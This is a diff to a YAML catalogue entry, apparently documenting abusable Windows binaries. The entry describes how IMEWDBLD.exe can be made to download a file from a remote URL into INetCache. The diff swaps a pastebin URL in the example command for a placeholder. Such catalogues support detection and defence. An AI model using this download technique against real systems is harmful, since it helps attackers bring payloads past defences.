@@ -1,10 +1,10 @@
 ---
 Name: IMEWDBLD.exe
 Description: Microsoft IME Open Extended Dictionary Module
-Author: 'Wade Hickey'
+Author: Wade Hickey
 Created: 2020-03-05
 Commands:
-  - Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw
+  - Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
     Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.
     Usecase: Download file from Internet
     Category: Download
